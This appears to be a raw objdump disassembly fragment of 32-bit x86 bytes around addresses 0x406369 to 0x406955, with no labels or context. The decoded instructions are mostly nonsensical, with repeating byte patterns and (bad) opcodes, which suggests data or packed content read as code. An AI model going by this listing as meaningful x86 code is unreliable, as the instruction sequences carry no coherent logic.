  406369:	84 68 6a             	test   %ch,0x6a(%eax)
  40636c:	93                   	xchg   %eax,%ebx
  40636d:	98                   	cwtl
  40636e:	4e                   	dec    %esi
  40636f:	cc                   	int3
  406370:	20 96 12 1d 44 27    	and    %dl,0x27441d12(%esi)
  406376:	d1 45 0c             	roll   $1,0xc(%ebp)
  406379:	10 87 88 c3 c4 11    	adc    %al,0x11c4c388(%edi)
  40637f:	e2 28                	loop   0x4063a9
  406381:	71 8c                	jno    0x40630f
  406383:	38 4e 3c             	cmp    %cl,0x3c(%esi)
  406386:	4c                   	dec    %esp
  406387:	04 2b                	add    $0x2b,%al
  406389:	b5 4f                	mov    $0x4f,%ch
  40638b:	4c                   	dec    %esp
  40638c:	27                   	daa
  40638d:	66 10 4b 89          	data16 adc %cl,-0x77(%ebx)
  406391:	0e                   	push   %cs
  406392:	a2 93 e8 22 06       	mov    %al,0x622e893
  406397:	88 43 c4             	mov    %al,-0x3c(%ebx)
  40639a:	61                   	popa
  40639b:	e2 08                	loop   0x4063a5
  40639d:	71 8c                	jno    0x40632b
  40639f:	78 58                	js     0x4063f9
  4063a1:	6d                   	insl   (%dx),%es:(%edi)
  4063a2:	2d 86 5a 23 66       	sub    $0x66235a86,%eax
  4063a7:	10 4b 89             	adc    %cl,-0x77(%ebx)
  4063aa:	0e                   	push   %cs
  4063ab:	a2 93 e8 22 06       	mov    %al,0x622e893
  4063b0:	88 43 c4             	mov    %al,-0x3c(%ebx)
  4063b3:	61                   	popa
  4063b4:	e2 08                	loop   0x4063be
  4063b6:	71 94                	jno    0x40634c
  4063b8:	38 46 1c             	cmp    %al,0x1c(%esi)
  4063bb:	27                   	daa
  4063bc:	1e                   	push   %ds
  4063bd:	26 82 8d da 27 a6 13 	orb    $0x33,%es:0x13a627da(%ebp)
  4063c4:	33 
  4063c5:	88 a5 44 07 d1 49    	mov    %ah,0x49d10744(%ebp)
  4063cb:	74 11                	je     0x4063de
  4063cd:	03 c4                	add    %esp,%eax
  4063cf:	21 e2                	and    %esp,%edx
  4063d1:	30 71 84             	xor    %dh,-0x7c(%ecx)
  4063d4:	38 4a 1c             	cmp    %cl,0x1c(%edx)
  4063d7:	23 8e 13 0f 13 61    	and    0x61130f13(%esi),%ecx
  4063dd:	26 b5 4f             	es mov $0x4f,%ch
  4063e0:	4c                   	dec    %esp
  4063e1:	27                   	daa
  4063e2:	66 10 4b 89          	data16 adc %cl,-0x77(%ebx)
  4063e6:	0e                   	push   %cs
  4063e7:	a2 93 e8 22 06       	mov    %al,0x622e893
  4063ec:	88 43 c4             	mov    %al,-0x3c(%ebx)
  4063ef:	61                   	popa
  4063f0:	e2 08                	loop   0x4063fa
  4063f2:	71 8c                	jno    0x406380
  4063f4:	78 98                	js     0x40638e
  4063f6:	08 b1 d4 26 31 9d    	or     %dh,-0x62ced92c(%ecx)
  4063fc:	98                   	cwtl
  4063fd:	41                   	inc    %ecx
  4063fe:	2c 25                	sub    $0x25,%al
  406400:	3a 88 4e a2 8b 18    	cmp    0x188ba24e(%eax),%cl
  406406:	20 0e                	and    %cl,(%esi)
  406408:	11 87 89 23 c4 51    	adc    %eax,0x51c42389(%edi)
  40640e:	e2 18                	loop   0x406428
  406410:	71 9c                	jno    0x4063ae
  406412:	78 98                	js     0x4063ac
  406414:	08 71 d4             	or     %dh,-0x2c(%ecx)
  406417:	3e 31 9d 98 41 2c 25 	xor    %ebx,%ds:0x252c4198(%ebp)
  40641e:	3a 88 4e a2 8b 18    	cmp    0x188ba24e(%eax),%cl
  406424:	20 0e                	and    %cl,(%esi)
  406426:	11 87 89 23 c4 51    	adc    %eax,0x51c42389(%edi)
  40642c:	e2 18                	loop   0x406446
  40642e:	71 9c                	jno    0x4063cc
  406430:	78 98                	js     0x4063ca
  406432:	08 76 6a             	or     %dh,0x6a(%esi)
  406435:	9f                   	lahf
  406436:	98                   	cwtl
  406437:	41                   	inc    %ecx
  406438:	2c 25                	sub    $0x25,%al
  40643a:	3a 88 4e a2 8b 18    	cmp    0x188ba24e(%eax),%cl
  406440:	20 0e                	and    %cl,(%esi)
  406442:	11 87 89 23 c4 51    	adc    %eax,0x51c42389(%edi)
  406448:	e2 18                	loop   0x406462
  40644a:	71 9c                	jno    0x4063e8
  40644c:	78 98                	js     0x4063e6
  40644e:	08 f1                	or     %dh,%cl
  406450:	d4 32                	aam    $0x32
  406452:	31 9d 98 41 2c 25    	xor    %ebx,0x252c4198(%ebp)
  406458:	3a 88 4e a2 8b 18    	cmp    0x188ba24e(%eax),%cl
  40645e:	20 8e 12 c7 89 90    	and    %cl,-0x6f7638ee(%esi)
  406464:	40                   	inc    %eax
  406465:	e7 12                	out    %eax,$0x12
  406467:	4b                   	dec    %ebx
  406468:	89 4e 62             	mov    %ecx,0x62(%esi)
  40646b:	80 38 4c             	cmpb   $0x4c,(%eax)
  40646e:	1c 25                	sbb    $0x25,%al
  406470:	8e 13                	mov    (%ebx),%ss
  406472:	21 91 ea 13 4b 89    	and    %edx,-0x76b4ec16(%ecx)
  406478:	4e                   	dec    %esi
  406479:	62 80 38 4a 1c 27    	bound  %eax,0x271c4a38(%eax)
  40647f:	42                   	inc    %edx
  406480:	12 d5                	adc    %ch,%dl
  406482:	24 96                	and    $0x96,%al
  406484:	12 9d c4 00 71 98    	adc    -0x678eff3c(%ebp),%bl
  40648a:	38 4a 1c             	cmp    %cl,0x1c(%edx)
  40648d:	27                   	daa
  40648e:	42                   	inc    %edx
  40648f:	32 d5                	xor    %ch,%dl
  406491:	24 3a                	and    $0x3a,%al
  406493:	89 01                	mov    %eax,(%ecx)
  406495:	e2 30                	loop   0x4064c7
  406497:	71 94                	jno    0x40642d
  406499:	38 4e 84             	cmp    %cl,-0x7c(%esi)
  40649c:	14 6a                	adc    $0x6a,%al
  40649e:	99                   	cltd
  40649f:	58                   	pop    %eax
  4064a0:	4a                   	dec    %edx
  4064a1:	74 12                	je     0x4064b5
  4064a3:	03 c4                	add    %esp,%eax
  4064a5:	61                   	popa
  4064a6:	e2 28                	loop   0x4064d0
  4064a8:	71 9c                	jno    0x406446
  4064aa:	08 a9 54 9f 58 4a    	or     %ch,0x4a589f54(%ecx)
  4064b0:	74 12                	je     0x4064c4
  4064b2:	03 c4                	add    %esp,%eax
  4064b4:	61                   	popa
  4064b5:	22 a4 51 1d 62 29 d1 	and    -0x2ed69de3(%ecx,%edx,2),%ah
  4064bc:	41                   	inc    %ecx
  4064bd:	74 12                	je     0x4064d1
  4064bf:	5d                   	pop    %ebp
  4064c0:	c4 00                	les    (%eax),%eax
  4064c2:	71 88                	jno    0x40644c
  4064c4:	38 4c 1c 21          	cmp    %cl,0x21(%esp,%ebx,1)
  4064c8:	8e 12                	mov    (%edx),%ss
  4064ca:	c7                   	(bad)
  4064cb:	88 e3                	mov    %ah,%bl
  4064cd:	c4 c3 44 48          	(bad)
  4064d1:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4064d2:	d1 21                	shll   $1,(%ecx)
  4064d4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4064d5:	13 33                	adc    (%ebx),%esi
  4064d7:	88 a5 44 07 d1 49    	mov    %ah,0x49d10744(%ebp)
  4064dd:	74 11                	je     0x4064f0
  4064df:	03 c4                	add    %esp,%eax
  4064e1:	21 e2                	and    %esp,%edx
  4064e3:	30 71 84             	xor    %dh,-0x7c(%ecx)
  4064e6:	38 4a 1c             	cmp    %cl,0x1c(%edx)
  4064e9:	23 8e 13 0f 13 21    	and    0x21130f13(%esi),%ecx
  4064ef:	83 da 27             	sbb    $0x27,%edx
  4064f2:	66 10 1d 44 27 d1 45 	data16 adc %bl,0x45d12744
  4064f9:	0c 10                	or     $0x10,%al
  4064fb:	87 88 c3 c4 11 e2    	xchg   %ecx,-0x1dee3b3d(%eax)
  406501:	28 71 8c             	sub    %dh,-0x74(%ecx)
  406504:	38 4e 3c             	cmp    %cl,0x3c(%esi)
  406507:	4c                   	dec    %esp
  406508:	84 4c 6a 93          	test   %cl,-0x6d(%edx,%ebp,2)
  40650c:	98                   	cwtl
  40650d:	4e                   	dec    %esi
  40650e:	cc                   	int3
  40650f:	20 96 12 1d 44 27    	and    %dl,0x27441d12(%esi)
  406515:	d1 45 0c             	roll   $1,0xc(%ebp)
  406518:	10 87 88 c3 c4 11    	adc    %al,0x11c4c388(%edi)
  40651e:	e2 28                	loop   0x406548
  406520:	71 8c                	jno    0x4064ae
  406522:	78 58                	js     0x40657c
  406524:	6d                   	insl   (%dx),%es:(%edi)
  406525:	33 8b da 24 66 10    	xor    0x106624da(%ebx),%ecx
  40652b:	4b                   	dec    %ebx
  40652c:	89 0e                	mov    %ecx,(%esi)
  40652e:	a2 93 e8 22 06       	mov    %al,0x622e893
  406533:	88 43 c4             	mov    %al,-0x3c(%ebx)
  406536:	61                   	popa
  406537:	e2 08                	loop   0x406541
  406539:	71 94                	jno    0x4064cf
  40653b:	38 46 1c             	cmp    %al,0x1c(%esi)
  40653e:	27                   	daa
  40653f:	1e                   	push   %ds
  406540:	26 c2 2c 6a          	es ret $0x6a2c
  406544:	9f                   	lahf
  406545:	98                   	cwtl
  406546:	4e                   	dec    %esi
  406547:	cc                   	int3
  406548:	20 96 12 1d 44 27    	and    %dl,0x27441d12(%esi)
  40654e:	d1 45 0c             	roll   $1,0xc(%ebp)
  406551:	10 87 88 c3 c4 11    	adc    %al,0x11c4c388(%edi)
  406557:	e2 28                	loop   0x406581
  406559:	71 8c                	jno    0x4064e7
  40655b:	38 4e 3c             	cmp    %cl,0x3c(%esi)
  40655e:	ac                   	lods   %ds:(%esi),%al
  40655f:	b6 3c                	mov    $0x3c,%dh
  406561:	9b da 24 96          	fisubl (%esi,%edx,4)
  406565:	12 1d 44 27 d1 45    	adc    0x45d12744,%bl
  40656b:	0c 10                	or     $0x10,%al
  40656d:	87 88 c3 c4 11 e2    	xchg   %ecx,-0x1dee3b3d(%eax)
  406573:	28 71 8c             	sub    %dh,-0x74(%ecx)
  406576:	38 4e 3c             	cmp    %cl,0x3c(%esi)
  406579:	4c                   	dec    %esp
  40657a:	84 39                	test   %bh,(%ecx)
  40657c:	d4 32                	aam    $0x32
  40657e:	31 9d 98 41 2c 25    	xor    %ebx,0x252c4198(%ebp)
  406584:	3a 88 4e a2 8b 18    	cmp    0x188ba24e(%eax),%cl
  40658a:	20 0e                	and    %cl,(%esi)
  40658c:	11 87 89 23 c4 51    	adc    %eax,0x51c42389(%edi)
  406592:	e2 18                	loop   0x4065ac
  406594:	71 9c                	jno    0x406532
  406596:	78 98                	js     0x406530
  406598:	08 73 a9             	or     %dh,-0x57(%ebx)
  40659b:	7d 62                	jge    0x4065ff
  40659d:	06                   	push   %es
  40659e:	d1 41 74             	roll   $1,0x74(%ecx)
  4065a1:	12 5d c4             	adc    -0x3c(%ebp),%bl
  4065a4:	00 71 88             	add    %dh,-0x78(%ecx)
  4065a7:	38 4c 1c 21          	cmp    %cl,0x21(%esp,%ebx,1)
  4065ab:	8e 12                	mov    (%edx),%ss
  4065ad:	c7                   	(bad)
  4065ae:	88 e3                	mov    %ah,%bl
  4065b0:	c4 c3 44 c8          	(bad)
  4065b4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4065b5:	36 89 e9             	ss mov %ebp,%ecx
  4065b8:	c4 0c 62             	les    (%edx,%eiz,2),%ecx
  4065bb:	29 d1                	sub    %edx,%ecx
  4065bd:	41                   	inc    %ecx
  4065be:	74 12                	je     0x4065d2
  4065c0:	5d                   	pop    %ebp
  4065c1:	c4 00                	les    (%eax),%eax
  4065c3:	71 88                	jno    0x40654d
  4065c5:	38 4c 1c 21          	cmp    %cl,0x21(%esp,%ebx,1)
  4065c9:	8e 12                	mov    (%edx),%ss
  4065cb:	c7                   	(bad)
  4065cc:	88 e3                	mov    %ah,%bl
  4065ce:	c4 c3 6a cb          	(bad)
  4065d2:	f3 a8 4d             	repz test $0x4d,%al
  4065d5:	a2 83 e8 24 ba       	mov    %al,0xba24e883
  4065da:	88 01                	mov    %al,(%ecx)
  4065dc:	e2 10                	loop   0x4065ee
  4065de:	71 98                	jno    0x406578
  4065e0:	38 42 1c             	cmp    %al,0x1c(%edx)
  4065e3:	25 8e 11 c7 89       	and    $0x89c7118e,%eax
  4065e8:	87 89 90 43 6d 12    	xchg   %ecx,0x126d4390(%ecx)
  4065ee:	d3 89 19 c4 52 a2    	rorl   %cl,-0x5dad3be7(%ecx)
  4065f4:	83 e8 24             	sub    $0x24,%eax
  4065f7:	ba 88 01 e2 10       	mov    $0x10e20188,%edx
  4065fc:	71 98                	jno    0x406596
  4065fe:	38 4a 1c             	cmp    %cl,0x1c(%edx)
  406601:	57                   	push   %edi
  406602:	5b                   	pop    %ebx
  406603:	c8 a5 73 89          	enter  $0x73a5,$0x89
  406607:	4e                   	dec    %esi
  406608:	62 80 38 4c 1c 25    	bound  %eax,0x251c4c38(%eax)
  40660e:	8e 13                	mov    (%ebx),%ss
  406610:	61                   	popa
  406611:	3e d5 27             	ds aad $0x27
  406614:	96                   	xchg   %eax,%esi
  406615:	12 1d 44 27 d1 45    	adc    0x45d12744,%bl
  40661b:	0c 10                	or     $0x10,%al
  40661d:	87 88 c3 c4 11 e2    	xchg   %ecx,-0x1dee3b3d(%eax)
  406623:	28 71 8c             	sub    %dh,-0x74(%ecx)
  406626:	38 4e 3c             	cmp    %cl,0x3c(%esi)
  406629:	4c                   	dec    %esp
  40662a:	64 0b a8 4d 62 06 b1 	or     %fs:-0x4ef99db3(%eax),%ebp
  406631:	94                   	xchg   %eax,%esp
  406632:	e8 20 3a 89 2e       	call   0x2ec9a057
  406637:	62 80 38 44 1c 26    	bound  %eax,0x261c4438(%eax)
  40663d:	8e 12                	mov    (%edx),%ss
  40663f:	c7                   	(bad)
  406640:	89 90 47 ed 10 4b    	mov    %edx,0x4b10ed47(%eax)
  406646:	89 4e e2             	mov    %ecx,-0x1e(%esi)
  406649:	28 71 9c             	sub    %dh,-0x64(%ecx)
  40664c:	08 0b                	or     %cl,(%ebx)
  40664e:	a9 0e b1 94 e8       	test   $0xe894b10e,%eax
  406653:	24 06                	and    $0x6,%al
  406655:	88 c3                	mov    %al,%bl
  406657:	c4 51 e2             	les    -0x1e(%ecx),%edx
  40665a:	38 11                	cmp    %dl,(%ecx)
  40665c:	f2 a9 3e b1 94 18    	repnz test $0x1894b13e,%eax
  406662:	20 0e                	and    %cl,(%esi)
  406664:	13 47 89             	adc    -0x77(%edi),%eax
  406667:	e3 44                	jecxz  0x4066ad
  406669:	28 a0 9a c4 52 a2    	sub    %ah,-0x5dad3b66(%eax)
  40666f:	93                   	xchg   %eax,%ebx
  406670:	18 20                	sbb    %ah,(%eax)
  406672:	0e                   	push   %cs
  406673:	13 47 89             	adc    -0x77(%edi),%eax
  406676:	50                   	push   %eax
  406677:	48                   	dec    %eax
  406678:	35 89 a5 44 27       	xor    $0x2744a589,%eax
  40667d:	31 40 1c             	xor    %eax,0x1c(%eax)
  406680:	26 8e 12             	mov    %es:(%edx),%ss
  406683:	c7                   	(bad)
  406684:	89 50 44             	mov    %edx,0x44(%eax)
  406687:	f5                   	cmc
  406688:	89 a5 44 27 31 40    	mov    %esp,0x40312744(%ebp)
  40668e:	1c 26                	sbb    $0x26,%al
  406690:	8e 12                	mov    (%edx),%ss
  406692:	c7                   	(bad)
  406693:	89 b0 88 ea 10 03    	mov    %esi,0x310ea88(%eax)
  406699:	c4 61 e2             	les    -0x1e(%ecx),%esp
  40669c:	28 71 9c             	sub    %dh,-0x64(%ecx)
  40669f:	08 8b a9 4d 62 29    	or     %cl,0x29624da9(%ebx)
  4066a5:	d1 49 0c             	rorl   $1,0xc(%ecx)
  4066a8:	10 87 89 a3 c4 71    	adc    %al,0x71c4a389(%edi)
  4066ae:	22 14 53             	and    (%ebx,%edx,2),%dl
  4066b1:	7d 62                	jge    0x406715
  4066b3:	29 d1                	sub    %edx,%ecx
  4066b5:	49                   	dec    %ecx
  4066b6:	0c 10                	or     $0x10,%al
  4066b8:	87 89 a3 c4 71 22    	xchg   %ecx,0x2271c4a3(%ecx)
  4066be:	2c a1                	sub    $0xa1,%al
  4066c0:	fa                   	cli
  4066c1:	c4 52 a2             	les    -0x5e(%edx),%edx
  4066c4:	93                   	xchg   %eax,%ebx
  4066c5:	18 20                	sbb    %ah,(%eax)
  4066c7:	0e                   	push   %cs
  4066c8:	13 47 89             	adc    -0x77(%edi),%eax
  4066cb:	e3 44                	jecxz  0x406711
  4066cd:	28 a1 fa c4 61 e2    	sub    %ah,-0x1d9e3b06(%ecx)
  4066d3:	28 71 9c             	sub    %dh,-0x64(%ecx)
  4066d6:	08 4b a9             	or     %cl,-0x57(%ebx)
  4066d9:	94                   	xchg   %eax,%esp
  4066da:	58                   	pop    %eax
  4066db:	4a                   	dec    %edx
  4066dc:	74 12                	je     0x4066f0
  4066de:	03 c4                	add    %esp,%eax
  4066e0:	61                   	popa
  4066e1:	e2 28                	loop   0x40670b
  4066e3:	71 9c                	jno    0x406681
  4066e5:	08 cb                	or     %cl,%bl
  4066e7:	a8 3e                	test   $0x3e,%al
  4066e9:	31 40 1c             	xor    %eax,0x1c(%eax)
  4066ec:	26 8e 12             	mov    %es:(%edx),%ss
  4066ef:	c7                   	(bad)
  4066f0:	89 b0 9c ea 10 4b    	mov    %esi,0x4b10ea9c(%eax)
  4066f6:	89 4e 62             	mov    %ecx,0x62(%esi)
  4066f9:	80 38 4c             	cmpb   $0x4c,(%eax)
  4066fc:	1c 25                	sbb    $0x25,%al
  4066fe:	8e 13                	mov    (%ebx),%ss
  406700:	61                   	popa
  406701:	05 d5 21 06 88       	add    $0x880621d5,%eax
  406706:	c3                   	ret
  406707:	c4 51 e2             	les    -0x1e(%ecx),%edx
  40670a:	38 11                	cmp    %dl,(%ecx)
  40670c:	56                   	push   %esi
  40670d:	52                   	push   %edx
  40670e:	9b                   	fwait
  40670f:	c4 52 a2             	les    -0x5e(%edx),%edx
  406712:	93                   	xchg   %eax,%ebx
  406713:	18 20                	sbb    %ah,(%eax)
  406715:	0e                   	push   %cs
  406716:	13 47 89             	adc    -0x77(%edi),%eax
  406719:	e3 44                	jecxz  0x40675f
  40671b:	58                   	pop    %eax
  40671c:	45                   	inc    %ebp
  40671d:	f5                   	cmc
  40671e:	89 a5 44 27 31 40    	mov    %esp,0x40312744(%ebp)
  406724:	1c 26                	sbb    $0x26,%al
  406726:	8e 12                	mov    (%edx),%ss
  406728:	c7                   	(bad)
  406729:	89 b0 9a ea 13 03    	mov    %esi,0x313ea9a(%eax)
  40672f:	c4 61 e2             	les    -0x1e(%ecx),%esp
  406732:	28 71 9c             	sub    %dh,-0x64(%ecx)
  406735:	08 a5 54 87 58 4a    	or     %ah,0x4a588754(%ebp)
  40673b:	74 12                	je     0x40674f
  40673d:	03 c4                	add    %esp,%eax
  40673f:	61                   	popa
  406740:	e2 28                	loop   0x40676a
  406742:	71 9c                	jno    0x4066e0
  406744:	08 0e                	or     %cl,(%esi)
  406746:	aa                   	stos   %al,%es:(%edi)
  406747:	4f                   	dec    %edi
  406748:	2c 25                	sub    $0x25,%al
  40674a:	3a 89 01 e2 30 71    	cmp    0x7130e201(%ecx),%cl
  406750:	94                   	xchg   %eax,%esp
  406751:	08 6b a8             	or     %ch,-0x58(%ebx)
  406754:	26 b1 94             	es mov $0x94,%cl
  406757:	e8 24 06 88 c3       	call   0xc3c86d80
  40675c:	c4 51 e2             	les    -0x1e(%ecx),%edx
  40675f:	38 11                	cmp    %dl,(%ecx)
  406761:	ca a8 3e             	lret   $0x3ea8
  406764:	b1 94                	mov    $0x94,%cl
  406766:	e8 24 06 88 e3       	call   0xe3c86d8f
  40676b:	44                   	inc    %esp
  40676c:	28 a7 3a c4 52 a2    	sub    %ah,-0x5dad3bc6(%edi)
  406772:	93                   	xchg   %eax,%ebx
  406773:	18 20                	sbb    %ah,(%eax)
  406775:	0e                   	push   %cs
  406776:	13 47 89             	adc    -0x77(%edi),%eax
  406779:	e3 44                	jecxz  0x4067bf
  40677b:	a8 a0                	test   $0xa0,%al
  40677d:	fa                   	cli
  40677e:	c4 52 a2             	les    -0x5e(%edx),%edx
  406781:	93                   	xchg   %eax,%ebx
  406782:	18 20                	sbb    %ah,(%eax)
  406784:	0e                   	push   %cs
  406785:	13 47 89             	adc    -0x77(%edi),%eax
  406788:	e3 44                	jecxz  0x4067ce
  40678a:	a8 a4                	test   $0xa4,%al
  40678c:	fa                   	cli
  40678d:	2a d7                	sub    %bh,%dl
  40678f:	d2 59 44             	rcrb   %cl,0x44(%ecx)
  406792:	27                   	daa
  406793:	31 40 1c             	xor    %eax,0x1c(%eax)
  406796:	26 8e 12             	mov    %es:(%edx),%ss
  406799:	c7                   	(bad)
  40679a:	89 50 45             	mov    %edx,0x45(%eax)
  40679d:	f5                   	cmc
  40679e:	89 a5 44 27 31 40    	mov    %esp,0x40312744(%ebp)
  4067a4:	1c 26                	sbb    $0x26,%al
  4067a6:	8e 12                	mov    (%edx),%ss
  4067a8:	a1 9a 6a 12 4b       	mov    0x4b126a9a,%eax
  4067ad:	89 4e 62             	mov    %ecx,0x62(%esi)
  4067b0:	80 38 4c             	cmpb   $0x4c,(%eax)
  4067b3:	1c 25                	sbb    $0x25,%al
  4067b5:	8e 13                	mov    (%ebx),%ss
  4067b7:	2b 20                	sub    (%eax),%esp
  4067b9:	a0 54 e3 4f 2d       	mov    0x2d4fe354,%al
  4067be:	5c                   	pop    %esp
  4067bf:	af                   	scas   %es:(%edi),%eax
  4067c0:	d4 e3                	aam    $0xe3
  4067c2:	4f                   	dec    %edi
  4067c3:	26 2c 87             	es sub $0x87,%al
  4067c6:	33 e0                	xor    %eax,%esp
  4067c8:	22 f8                	and    %al,%bh
  4067ca:	35 bc 0a b3 58       	xor    $0x58b30abc,%eax
  4067cf:	11 db                	adc    %ebx,%ebx
  4067d1:	c1 4e 67 17          	rorl   $0x17,0x67(%esi)
  4067d5:	b2 bb                	mov    $0xbb,%dl
  4067d7:	98                   	cwtl
  4067d8:	49                   	dec    %ecx
  4067d9:	09 55 32             	or     %edx,0x32(%ebp)
  4067dc:	15 a7 c2 bf 85       	adc    $0x85bfc2a7,%eax
  4067e1:	60                   	pusha
  4067e2:	00 33                	add    %dh,(%ebx)
  4067e4:	58                   	pop    %eax
  4067e5:	20 02                	and    %al,(%edx)
  4067e7:	22 61 06             	and    0x6(%ecx),%ah
  4067ea:	44                   	inc    %esp
  4067eb:	41                   	inc    %ecx
  4067ec:	32 72 36             	xor    0x36(%edx),%dh
  4067ef:	44                   	inc    %esp
  4067f0:	c3                   	ret
  4067f1:	7c b0                	jl     0x4067a3
  4067f3:	42                   	inc    %edx
  4067f4:	31 c4                	xor    %eax,%esp
  4067f6:	80 03 6c             	addb   $0x6c,(%ebx)
  4067f9:	70 14                	jo     0x40680f
  4067fb:	cc                   	int3
  4067fc:	84 06                	test   %al,(%esi)
  4067fe:	88 85 56 88 83 e3    	mov    %al,-0x1c7c77aa(%ebp)
  406804:	c0 0e dd             	rorb   $0xdd,(%esi)
  406807:	10 cf                	adc    %cl,%bh
  406809:	ff b4 24 ec 81 44 38 	push   0x384481ec(%esp)
  406810:	0d 92 e0 1c 3c       	or     $0x3c1ce092,%eax
  406815:	eb 42                	jmp    0x406859
  406817:	48                   	dec    %eax
  406818:	81 2b 20 15 ae 85    	subl   $0x85ae1520,(%ebx)
  40681e:	74 f8                	je     0x406818
  406820:	15 64 f0 3f 65       	adc    $0x653ff064,%eax
  406825:	03 f7                	add    %edi,%esi
  406827:	40                   	inc    %eax
  406828:	16                   	push   %ss
  406829:	3c 02                	cmp    $0x2,%al
  40682b:	b3 e0                	mov    $0xe0,%bl
  40682d:	69 6c f1 79 98 03 2f 	imul   $0xc32f0398,0x79(%ecx,%esi,8),%ebp
  406834:	c3 
  406835:	5c                   	pop    %esp
  406836:	78 03                	js     0x40683b
  406838:	b2 e1                	mov    $0xe1,%dl
  40683a:	03 98 07 ff 84 1c    	add    0x1c84ff07(%eax),%ebx
  406840:	f8                   	clc
  406841:	0a af 62 60 0b 20    	or     0x200b6062(%edi),%ch
  406847:	8c 01                	mov    %es,(%ecx)
  406849:	2c cd                	sub    $0xcd,%al
  40684b:	3a c6                	cmp    %dh,%al
  40684d:	0c 90                	or     $0x90,%al
  40684f:	9b                   	fwait
  406850:	e8 42 5e c1 38       	call   0x3901c697
  406855:	ff 9e c5 59 95 e1    	lcall  *-0x1e6aa63b(%esi)
  40685b:	36 f3 bf 70 73 1b f2 	ss repz mov $0xf21b7370,%edi
  406862:	8f                   	(bad)
  406863:	f1                   	int1
  406864:	de 1f                	ficomps (%edi)
  406866:	d4 d9                	aam    $0xd9
  406868:	9b                   	fwait
  406869:	ca e9 21             	lret   $0x21e9
  40686c:	2e a5                	movsl  %cs:(%esi),%es:(%edi)
  40686e:	fa                   	cli
  40686f:	cf                   	iret
  406870:	65 f6 23             	mulb   %gs:(%ebx)
  406873:	17                   	pop    %ss
  406874:	85 ec                	test   %ebp,%esp
  406876:	0a d6                	or     %dh,%dl
  406878:	51                   	push   %ecx
  406879:	eb ab                	jmp    0x406826
  40687b:	e7 aa                	out    %eax,$0xaa
  40687d:	ed                   	in     (%dx),%eax
  40687e:	e8 cf ba 20 7e       	call   0x7e612352
  406883:	4f                   	dec    %edi
  406884:	f0 5a                	lock pop %edx
  406886:	11 71 fc             	adc    %esi,-0x4(%ecx)
  406889:	dc 0d f6 21 e4 e9    	fmull  0xe9e421f6
  40688f:	76 ae                	jbe    0x40683f
  406891:	3c 90                	cmp    $0x90,%al
  406893:	c8 db e9 48          	enter  $0xe9db,$0x48
  406897:	99                   	cltd
  406898:	6e                   	outsb  %ds:(%esi),(%dx)
  406899:	6b 47 25 9c          	imul   $0xffffff9c,0x25(%edi),%eax
  40689d:	85 fc                	test   %edi,%esp
  40689f:	00 2e                	add    %ch,(%esi)
  4068a1:	43                   	inc    %ebx
  4068a2:	ce                   	into
  4068a3:	64 d7                	xlat   %fs:(%ebx)
  4068a5:	4d                   	dec    %ebp
  4068a6:	f3 ac                	rep lods %ds:(%esi),%al
  4068a8:	48                   	dec    %eax
  4068a9:	ab                   	stos   %eax,%es:(%edi)
  4068aa:	6b 9a 35 ef 9b c5 23 	imul   $0x23,-0x3a6410cb(%edx),%ebx
  4068b1:	dc 9f c5 79 a7 8d    	fcompl -0x7258863b(%edi)
  4068b7:	d7                   	xlat   %ds:(%ebx)
  4068b8:	a9 36 f5 4f f3       	test   $0xf34ff536,%eax
  4068bd:	dc 98 18 22 e5 f5    	fcompl -0xa1adde8(%eax)
  4068c3:	0d d9 7d 64 3f       	or     $0x3f647dd9,%eax
  4068c8:	62 99 6e 76 6a 9f    	bound  %ebx,-0x60958992(%ecx)
  4068ce:	94                   	xchg   %eax,%esp
  4068cf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4068d0:	f2 bf f5 6f 65 ca    	repnz mov $0xca656ff5,%edi
  4068d6:	dd d3                	fst    %st(3)
  4068d8:	3c 6b                	cmp    $0x6b,%al
  4068da:	3a 75 8c             	cmp    -0x74(%ebp),%dh
  4068dd:	49                   	dec    %ecx
  4068de:	5c                   	pop    %esp
  4068df:	77 67                	ja     0x406948
  4068e1:	4d                   	dec    %ebp
  4068e2:	b7 fe                	mov    $0xfe,%bh
  4068e4:	74 ea                	je     0x4068d0
  4068e6:	b8 0c 9c 07 32       	mov    $0x32079c0c,%eax
  4068eb:	38 3f                	cmp    %bh,(%edi)
  4068ed:	8d                   	lea    (bad),%esp
  4068ee:	e6 fc                	out    %al,$0xfc
  4068f0:	27                   	daa
  4068f1:	f5                   	cmc
  4068f2:	73 82                	jae    0x406876
  4068f4:	8d                   	lea    (bad),%esi
  4068f5:	f3 42                	repz inc %edx
  4068f7:	ea 81 bc 38 ce 35 b6 	ljmp   $0xb635,$0xce38bc81
  4068fe:	9f                   	lahf
  4068ff:	d6                   	salc
  406900:	03 29                	add    (%ecx),%ebp
  406902:	d4 42                	aam    $0x42
  406904:	dd b4 e7 d8 77 99 8f 	fnsave -0x70668828(%edi,%eiz,8)
  40690b:	4d                   	dec    %ebp
  40690c:	b3 e6                	mov    $0xe6,%bl
  40690e:	46                   	inc    %esi
  40690f:	8a ea                	mov    %dl,%ch
  406911:	1a ab f7 27 c5 33    	sbb    0x33c527f7(%ebx),%ch
  406917:	fd                   	std
  406918:	b1 48                	mov    $0x48,%cl
  40691a:	ca 7a ee             	lret   $0xee7a
  40691d:	bf 3e 27 db 2c       	mov    $0x2cdb273e,%edi
  406922:	5c                   	pop    %esp
  406923:	b7 65                	mov    $0x65,%bh
  406925:	fe                   	(bad)
  406926:	37                   	aaa
  406927:	c7                   	(bad)
  406928:	ee                   	out    %al,(%dx)
  406929:	c3                   	ret
  40692a:	cc                   	int3
  40692b:	e9 c6 39 9d 3a       	jmp    0x3adda2f6
  406930:	81 e8 ff 09 c6 99    	sub    $0x99c609ff,%eax
  406936:	6f                   	outsl  %ds:(%esi),(%dx)
  406937:	99                   	cltd
  406938:	ee                   	out    %al,(%dx)
  406939:	fd                   	std
  40693a:	72 02                	jb     0x40693e
  40693c:	dd 65 6f             	frstor 0x6f(%ebp)
  40693f:	d1 88 a8 67 dd 40    	rorl   $1,0x40dd67a8(%eax)
  406945:	77 ca                	ja     0x406911
  406947:	c7                   	(bad)
  406948:	f1                   	int1
  406949:	5a                   	pop    %edx
  40694a:	3b 6a e9             	cmp    -0x17(%edx),%ebp
  40694d:	eb d4                	jmp    0x406923
  40694f:	57                   	push   %edi
  406950:	9b                   	fwait
  406951:	89 77 67             	mov    %esi,0x67(%edi)
  406954:	4c                   	dec    %esp
  406955:	37                   	aaa
